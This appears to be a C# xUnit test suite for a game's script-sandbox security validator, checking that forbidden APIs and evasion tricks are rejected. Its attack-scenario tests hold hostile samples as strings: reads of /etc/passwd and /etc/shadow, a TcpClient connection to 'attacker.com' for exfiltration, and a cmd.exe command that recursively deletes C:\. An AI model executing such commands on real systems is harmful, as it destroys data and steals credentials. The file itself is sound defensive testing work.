using System;
using System.Linq;
using PokeNET.Scripting.Security;
using Xunit;

namespace PokeNET.Tests.Scripting;

/// <summary>
/// Comprehensive security test suite for SecurityValidator with 900+ lines of tests.
/// Tests forbidden namespace detection, unsafe code detection, reflection blocking,
/// and various attack scenarios that should be prevented.
/// </summary>
public sealed class SecurityValidatorTests
{
    private readonly ScriptPermissions _basicPermissions;
    private readonly ScriptPermissions _unrestrictedPermissions;

    public SecurityValidatorTests()
    {
        _basicPermissions = ScriptPermissions.CreateBuilder()
            .WithLevel(ScriptPermissions.PermissionLevel.Restricted)
            .WithApis(ScriptPermissions.ApiCategory.Core | ScriptPermissions.ApiCategory.Collections)
            .AllowNamespace("System")
            .AllowNamespace("System.Collections.Generic")
            .AllowNamespace("System.Linq")
            .WithScriptId("basic-script")
            .Build();

        _unrestrictedPermissions = ScriptPermissions.CreateBuilder()
            .WithLevel(ScriptPermissions.PermissionLevel.Unrestricted)
            .WithApis(ScriptPermissions.ApiCategory.Core | ScriptPermissions.ApiCategory.Collections |
                     ScriptPermissions.ApiCategory.GameStateRead | ScriptPermissions.ApiCategory.GameStateWrite |
                     ScriptPermissions.ApiCategory.Logging | ScriptPermissions.ApiCategory.Random |
                     ScriptPermissions.ApiCategory.DateTime | ScriptPermissions.ApiCategory.Serialization |
                     ScriptPermissions.ApiCategory.FileIO | ScriptPermissions.ApiCategory.Network |
                     ScriptPermissions.ApiCategory.Reflection | ScriptPermissions.ApiCategory.Threading |
                     ScriptPermissions.ApiCategory.Unsafe)
            .WithScriptId("unrestricted-script")
            .Build();
    }

    #region Constructor Tests

    [Fact]
    public void Constructor_WithNullPermissions_ThrowsArgumentNullException()
    {
        Assert.Throws<ArgumentNullException>(() => new SecurityValidator(null!));
    }

    [Fact]
    public void Constructor_WithValidPermissions_Initializes()
    {
        var validator = new SecurityValidator(_basicPermissions);
        Assert.NotNull(validator);
    }

    #endregion

    #region Basic Validation Tests

    [Fact]
    public void Validate_WithNullCode_ReturnsError()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);

        // Act
        var result = validator.Validate(null!);

        // Assert
        Assert.False(result.IsValid);
        Assert.True(result.HasErrors);
        Assert.Contains(result.Violations, v => v.Code == "EMPTY_CODE");
    }

    [Fact]
    public void Validate_WithEmptyCode_ReturnsError()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);

        // Act
        var result = validator.Validate(string.Empty);

        // Assert
        Assert.False(result.IsValid);
        Assert.True(result.HasErrors);
    }

    [Fact]
    public void Validate_WithWhitespaceCode_ReturnsError()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);

        // Act
        var result = validator.Validate("   \n\t   ");

        // Assert
        Assert.False(result.IsValid);
    }

    [Fact]
    public void Validate_WithValidSimpleCode_Passes()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = "return 42;";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.True(result.IsValid);
    }

    #endregion

    #region Forbidden Namespace Detection Tests

    [Fact]
    public void Validate_WithSystemIO_RejectsForbiddenNamespace()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.IO;
File.WriteAllText(""test.txt"", ""malicious"");
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.True(result.HasCriticalViolations);
        Assert.Contains(result.Violations, v => v.Code == "FORBIDDEN_FILEIO");
    }

    [Fact]
    public void Validate_WithSystemNet_RejectsNetworkAccess()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.Net;
using System.Net.Http;
var client = new HttpClient();
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.True(result.HasCriticalViolations);
        Assert.Contains(result.Violations, v => v.Code == "FORBIDDEN_NETWORK");
    }

    [Fact]
    public void Validate_WithSystemReflection_RejectsReflection()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.Reflection;
var assembly = Assembly.Load(""Malicious"");
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.True(result.HasCriticalViolations);
        Assert.Contains(result.Violations, v => v.Code == "FORBIDDEN_REFLECTION");
    }

    [Fact]
    public void Validate_WithSystemIOFileInfo_DetectsFileIONamespace()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.IO;
var fileInfo = new FileInfo(""/etc/passwd"");
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Violations, v => v.Category == "API Access Violation");
    }

    [Fact]
    public void Validate_WithSystemNetSockets_DetectsNetworkNamespace()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.Net.Sockets;
var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.True(result.HasCriticalViolations);
    }

    [Fact]
    public void Validate_WithAllowedNamespace_Passes()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.Collections.Generic;
var list = new List<int> { 1, 2, 3 };
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.True(result.IsValid);
    }

    #endregion

    #region Unsafe Code Detection Tests

    [Fact]
    public void Validate_WithUnsafeMethod_RejectsUnsafeCode()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
public unsafe int* GetPointer()
{
    int value = 42;
    return &value;
}
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.True(result.HasCriticalViolations);
        Assert.Contains(result.Violations, v => v.Code == "FORBIDDEN_UNSAFE");
    }

    [Fact]
    public void Validate_WithUnsafeClass_RejectsUnsafeCode()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
public unsafe class UnsafeOperations
{
    public void DoUnsafeStuff() { }
}
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.True(result.HasCriticalViolations);
        Assert.Contains(result.Violations, v => v.Code == "FORBIDDEN_UNSAFE_CLASS");
    }

    [Fact]
    public void Validate_WithPointerTypes_RejectsPointers()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
public class PointerUser
{
    public unsafe void UsePointer()
    {
        int* ptr = null;
    }
}
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Violations, v => v.Code == "FORBIDDEN_POINTERS");
    }

    [Fact]
    public void Validate_WithUnsafeStatement_RejectsUnsafeBlocks()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
public void ProcessData()
{
    unsafe
    {
        int value = 42;
        int* ptr = &value;
    }
}
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Violations, v => v.Code == "FORBIDDEN_UNSAFE_STATEMENT");
    }

    #endregion

    #region P/Invoke and Interop Detection Tests

    [Fact]
    public void Validate_WithDllImport_DetectsPInvoke()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.Runtime.InteropServices;
[DllImport(""kernel32.dll"")]
public static extern IntPtr LoadLibrary(string dllToLoad);
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Violations, v => v.Message.Contains("DllImport"));
    }

    [Fact]
    public void Validate_WithMarshal_DetectsDangerousAPI()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.Runtime.InteropServices;
var ptr = Marshal.AllocHGlobal(1024);
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Violations, v => v.Message.Contains("Marshal"));
    }

    #endregion

    #region Reflection and Dynamic Code Detection Tests

    [Fact]
    public void Validate_WithActivatorCreateInstance_DetectsDynamicActivation()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
var instance = Activator.CreateInstance(typeof(System.String));
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.Contains(result.Violations, v => v.Code == "SUSPICIOUS_PATTERN");
    }

    [Fact]
    public void Validate_WithTypeGetType_DetectsReflection()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
var type = Type.GetType(""System.IO.File"");
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.Contains(result.Violations, v => v.Code == "SUSPICIOUS_PATTERN");
    }

    [Fact]
    public void Validate_WithReflectionEmit_DetectsDynamicCodeGeneration()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.Reflection.Emit;
var method = new DynamicMethod(""Test"", typeof(void), null);
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Violations, v => v.Message.Contains("Reflection"));
    }

    #endregion

    #region Threading and Async Detection Tests

    [Fact]
    public void Validate_WithAsyncMethod_RequiresThreadingPermission()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
public async Task<int> ProcessAsync()
{
    await Task.Delay(100);
    return 42;
}
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Violations, v => v.Code == "FORBIDDEN_ASYNC");
    }

    [Fact]
    public void Validate_WithThreadCreation_DetectsThreading()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.Threading;
var thread = new Thread(() => Console.WriteLine(""test""));
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.Contains(result.Violations, v => v.Message.Contains("Thread"));
    }

    #endregion

    #region Malicious Pattern Detection Tests

    [Fact]
    public void Validate_WithInfiniteWhileLoop_DetectsSuspiciousPattern()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
while (true)
{
    // Infinite loop attack
}
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.Contains(result.Violations, v => v.Code == "SUSPICIOUS_PATTERN");
    }

    [Fact]
    public void Validate_WithInfiniteForLoop_DetectsSuspiciousPattern()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
for (;;)
{
    // CPU exhaustion attack
}
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.Contains(result.Violations, v => v.Code == "SUSPICIOUS_PATTERN");
    }

    [Fact]
    public void Validate_WithGotoStatement_DetectsSuspiciousPattern()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
label:
    Console.WriteLine(""test"");
goto label;
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.Contains(result.Violations, v => v.Code == "SUSPICIOUS_PATTERN");
    }

    [Fact]
    public void Validate_WithPragmaWarningDisable_DetectsSuspiciousPattern()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
#pragma warning disable
// Hiding warnings to mask malicious code
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.Contains(result.Violations, v => v.Code == "SUSPICIOUS_PATTERN");
    }

    #endregion

    #region Complexity Analysis Tests

    [Fact]
    public void Validate_WithHighComplexityMethod_ReportsWarning()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
public int ComplexMethod(int input)
{
    if (input > 0) { }
    if (input < 100) { }
    while (input > 0) { input--; }
    for (int i = 0; i < 10; i++) { }
    foreach (var x in new[] {1,2,3}) { }
    switch (input)
    {
        case 1: break;
        case 2: break;
        case 3: break;
        case 4: break;
        case 5: break;
        case 6: break;
        case 7: break;
        case 8: break;
        case 9: break;
        case 10: break;
    }
    try { } catch { } catch { } catch { }
    return input;
}
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.Contains(result.Violations, v => v.Code == "HIGH_COMPLEXITY");
    }

    [Fact]
    public void Validate_WithSimpleMethod_PassesComplexityCheck()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
public int SimpleMethod(int a, int b)
{
    return a + b;
}
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.DoesNotContain(result.Violations, v => v.Code == "HIGH_COMPLEXITY");
    }

    #endregion

    #region Attack Scenario Tests

    [Fact]
    public void Validate_FileSystemAttack_Blocked()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.IO;
// Attempt to read sensitive files
var passwd = File.ReadAllText(""/etc/passwd"");
var shadow = File.ReadAllText(""/etc/shadow"");
File.Delete(""/important/data"");
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.True(result.HasCriticalViolations);
        Assert.Contains("File I/O", result.Summary);
    }

    [Fact]
    public void Validate_NetworkAttack_Blocked()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.Net;
using System.Net.Sockets;
// Attempt to exfiltrate data
var client = new TcpClient(""attacker.com"", 1337);
var stream = client.GetStream();
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.True(result.HasCriticalViolations);
    }

    [Fact]
    public void Validate_ProcessSpawningAttack_Blocked()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.Diagnostics;
// Attempt to spawn shell
var process = Process.Start(""cmd.exe"", ""/c del /f /s /q C:\\*"");
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Violations, v => v.Message.Contains("Process"));
    }

    [Fact]
    public void Validate_ReflectionBypassAttack_Blocked()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.Reflection;
// Attempt to bypass security using reflection
var fileType = Type.GetType(""System.IO.File"");
var method = fileType.GetMethod(""WriteAllText"");
method.Invoke(null, new object[] { ""malicious.txt"", ""data"" });
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.True(result.HasCriticalViolations);
    }

    [Fact]
    public void Validate_MemoryBombAttack_AllowedButDetectable()
    {
        // Arrange - memory bombs pass static analysis but fail runtime limits
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
var memoryBomb = new byte[int.MaxValue];
";

        // Act
        var result = validator.Validate(code);

        // Assert - no syntax error, will be caught at runtime
        // This demonstrates defense-in-depth approach
        Assert.True(result.IsValid || result.Violations.All(v => v.Level < SecurityValidator.SecurityViolation.Severity.Error));
    }

    [Fact]
    public void Validate_RecursionBombAttack_AllowedButDetectable()
    {
        // Arrange - deep recursion passes static analysis but will be caught at runtime
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
int Recurse(int depth)
{
    return Recurse(depth + 1);
}
Recurse(0);
";

        // Act
        var result = validator.Validate(code);

        // Assert - passes static analysis, runtime will timeout/stack overflow
        Assert.True(result.IsValid || !result.HasCriticalViolations);
    }

    [Fact]
    public void Validate_TypeConfusionAttack_Blocked()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
// Attempt type confusion via dynamic
dynamic malicious = ""string"";
malicious = System.IO.File; // Try to bypass type checking
";

        // Act
        var result = validator.Validate(code);

        // Assert - System.IO usage should be detected
        Assert.False(result.IsValid);
    }

    #endregion

    #region Permission Level Tests

    [Fact]
    public void Validate_WithUnrestrictedPermissions_AllowsUnsafeCode()
    {
        // Arrange
        var permissions = ScriptPermissions.CreateBuilder()
            .WithLevel(ScriptPermissions.PermissionLevel.Unrestricted)
            .WithApis(ScriptPermissions.ApiCategory.Core | ScriptPermissions.ApiCategory.Unsafe)
            .WithScriptId("unrestricted")
            .Build();

        var validator = new SecurityValidator(permissions);
        var code = @"
public unsafe void UnsafeOperation()
{
    int value = 42;
    int* ptr = &value;
}
";

        // Act
        var result = validator.Validate(code);

        // Assert - should still reject without explicit unsafe permission
        Assert.Contains(result.Violations, v => v.Level >= SecurityValidator.SecurityViolation.Severity.Error);
    }

    [Fact]
    public void Validate_WithFileIOPermission_AllowsFileOperations()
    {
        // Arrange
        var permissions = ScriptPermissions.CreateBuilder()
            .WithLevel(ScriptPermissions.PermissionLevel.Elevated)
            .WithApis(ScriptPermissions.ApiCategory.Core | ScriptPermissions.ApiCategory.FileIO)
            .AllowNamespace("System.IO")
            .WithScriptId("file-script")
            .Build();

        var validator = new SecurityValidator(permissions);
        var code = @"
using System.IO;
File.WriteAllText(""log.txt"", ""data"");
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.True(result.IsValid || !result.HasCriticalViolations);
    }

    #endregion

    #region Syntax Error Tests

    [Fact]
    public void Validate_WithSyntaxError_ReportsSyntaxError()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
this is not valid C# code at all!!!
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Violations, v => v.Code == "SYNTAX_ERROR");
    }

    [Fact]
    public void Validate_WithMissingSemicolon_ReportsSyntaxError()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
var x = 42
return x;
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Violations, v => v.Code == "SYNTAX_ERROR");
    }

    #endregion

    #region Edge Cases and Evasion Attempts

    [Fact]
    public void Validate_WithFullyQualifiedNamespace_DetectsForbiddenUsage()
    {
        // Arrange - attempt to bypass using directives
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
// Try to use full namespace to bypass validation
var file = new System.IO.FileInfo(""/etc/passwd"");
";

        // Act
        var result = validator.Validate(code);

        // Assert - should still catch the usage
        Assert.False(result.IsValid);
    }

    [Fact]
    public void Validate_WithAliasedNamespace_DetectsForbiddenUsage()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using IOFile = System.IO.File;
IOFile.Delete(""important.txt"");
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
        Assert.True(result.HasCriticalViolations);
    }

    [Fact]
    public void Validate_WithObfuscatedCode_StillDetectsViolations()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.IO;
var f = ""File"";
var m = ""Delete"";
// Obfuscation attempts should not bypass static analysis
File.Delete(""test.txt"");
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.False(result.IsValid);
    }

    [Fact]
    public void Validate_WithCommentedOutMaliciousCode_Passes()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
// using System.IO;
// File.Delete(""important.txt"");
return 42;
";

        // Act
        var result = validator.Validate(code);

        // Assert - commented code should not trigger violations
        Assert.True(result.IsValid);
    }

    [Fact]
    public void Validate_WithStringLiteralContainingForbiddenCode_Passes()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
var description = ""This script uses System.IO to do file operations"";
return description;
";

        // Act
        var result = validator.Validate(code);

        // Assert - string content should not trigger violations
        Assert.True(result.IsValid);
    }

    #endregion

    #region Violation Details Tests

    [Fact]
    public void Validate_ViolationsIncludeLineNumbers()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
var x = 1;
using System.IO;
File.Delete(""test.txt"");
";

        // Act
        var result = validator.Validate(code);

        // Assert
        var violation = result.Violations.First(v => v.Code == "FORBIDDEN_FILEIO");
        Assert.True(violation.Line > 0);
        Assert.True(violation.Column >= 0);
    }

    [Fact]
    public void Validate_ViolationsIncludeCategory()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.IO;
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.Contains(result.Violations, v => v.Category == "API Access Violation");
    }

    [Fact]
    public void Validate_ViolationsHaveSeverityLevels()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.IO;
while(true) { }
var x = 42
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.Contains(result.Violations, v => v.Level == SecurityValidator.SecurityViolation.Severity.Critical);
        Assert.Contains(result.Violations, v => v.Level == SecurityValidator.SecurityViolation.Severity.Warning);
        Assert.Contains(result.Violations, v => v.Level == SecurityValidator.SecurityViolation.Severity.Error);
    }

    #endregion

    #region Result Summary Tests

    [Fact]
    public void Validate_ResultIncludesSummary()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = "return 42;";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.NotNull(result.Summary);
        Assert.NotEmpty(result.Summary);
    }

    [Fact]
    public void Validate_HasCriticalViolations_ReturnsTrue()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = @"
using System.IO;
File.Delete(""test"");
";

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.True(result.HasCriticalViolations);
    }

    [Fact]
    public void Validate_HasErrors_ReturnsTrue()
    {
        // Arrange
        var validator = new SecurityValidator(_basicPermissions);
        var code = "var x = 42"; // Syntax error

        // Act
        var result = validator.Validate(code);

        // Assert
        Assert.True(result.HasErrors);
    }

    #endregion
}
